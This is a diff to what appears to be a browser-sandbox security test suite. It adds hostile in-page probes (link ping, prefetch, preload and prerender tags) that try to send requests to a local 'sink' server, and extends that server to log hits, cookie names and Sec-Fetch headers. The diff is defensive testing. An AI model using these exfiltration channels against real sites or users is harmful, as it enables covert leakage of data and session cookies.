@@ -61,6 +61,10 @@ const HOSTILE = String.raw`
   await tag("iframe src", () => { const f = document.createElement("iframe"); f.src = sink("/v1/beacon") + "iframe"; return f; });
   await attack("popup by an anchor with target=_blank", () => new Promise(res => { const a = document.createElement("a"); a.href = sink("/v1/beacon") + "blank"; a.target = "_blank"; document.body.appendChild(a); a.click(); setTimeout(() => res("clicked"), 800); }));
   await attack("popup by form target=_blank", () => new Promise(res => { const f = document.createElement("form"); f.action = sink("/v1/api/secret") + "formblank"; f.method = "post"; f.target = "_blank"; document.body.appendChild(f); try { f.submit(); } catch {} setTimeout(() => res("tried"), 800); }));
+  await attack("ping on a link", () => new Promise(res => { const a = document.createElement("a"); a.href = "#x"; a.setAttribute("ping", sink("/v1/beacon") + "ping"); document.body.appendChild(a); a.click(); setTimeout(() => res("clicked"), 800); }));
+  await tag("link rel=prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = sink("/v1/beacon") + "prefetch"; return l; });
+  await tag("link rel=preload as fetch", () => { const l = document.createElement("link"); l.rel = "preload"; l.as = "fetch"; l.crossOrigin = "anonymous"; l.href = sink("/v1/beacon") + "preload"; return l; });
+  await tag("link rel=prerender", () => { const l = document.createElement("link"); l.rel = "prerender"; l.href = sink("/v1/beacon") + "prerender"; return l; });
   await tag("form submit", () => { const f = document.createElement("form"); f.action = sink("/v1/api/secret") + "form"; f.method = "post"; setTimeout(() => { try { f.submit(); } catch {} }, 50); return f; });
   await tag("object data", () => { const o = document.createElement("object"); o.data = sink("/v1/beacon") + "object"; return o; });
   await tag("css url()", () => { const d = document.createElement("div"); d.style.cssText = "width:9px;height:9px;background:url('" + sink("/v1/beacon") + "cssurl')"; return d; });
@@ -157,7 +161,7 @@ function deckPage() {
  * @returns {Promise<{ url: string, port: number, state: any, close: () => Promise<void> }>}
  */
 export function startServer({ port = 0, host = "127.0.0.1" } = {}) {
-  const state = { hits: /** @type {Record<string, number>} */ ({}), cookies: /** @type {Record<string, string[]>} */ ({}), urls: /** @type {Record<string, { len: number, data: number, host: string }[]>} */ ({}), api: /** @type {{ via: string, cookie: boolean }[]} */ ([]), report: /** @type {any} */ (null), top: /** @type {any} */ (null), served: [] };
+  const state = { hits: /** @type {Record<string, number>} */ ({}), cookies: /** @type {Record<string, string[]>} */ ({}), urls: /** @type {Record<string, { len: number, data: number, host: string, sf: string }[]>} */ ({}), api: /** @type {{ via: string, cookie: boolean }[]} */ ([]), report: /** @type {any} */ (null), top: /** @type {any} */ (null), served: [] };
   const server = http.createServer((req, res) => {
     const u = new URL(req.url || "/", "http://x");
     const via = u.searchParams.get("via");
@@ -176,7 +180,7 @@ export function startServer({ port = 0, host = "127.0.0.1" } = {}) {
     if (u.pathname === "/v1/api/secret" || u.pathname === "/v1/beacon" || u.pathname === "/hijack") {
       const key = u.pathname === "/hijack" ? "hijack" : via || "unknown";
       state.hits[key] = (state.hits[key] || 0) + 1;
-      (state.urls[key] ||= []).push({ len: (req.url || "").length, data: (u.searchParams.get("d") || "").length, host: String(req.headers.host || "") });
+      (state.urls[key] ||= []).push({ len: (req.url || "").length, data: (u.searchParams.get("d") || "").length, host: String(req.headers.host || ""), sf: ["sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest"].map(h => `${h.slice(10)}=${req.headers[h] || "none"}`).join(" ") });
       (state.cookies[key] ||= []).push(String(req.headers.cookie || "").split(";").map(x => x.trim().split("=")[0]).filter(Boolean).join(","));
       if (u.pathname === "/v1/api/secret") state.api.push({ via: key, cookie: /vyre_session/.test(req.headers.cookie || "") });
       res.writeHead(200, { "content-type": "application/json", "access-control-allow-origin": "*" });
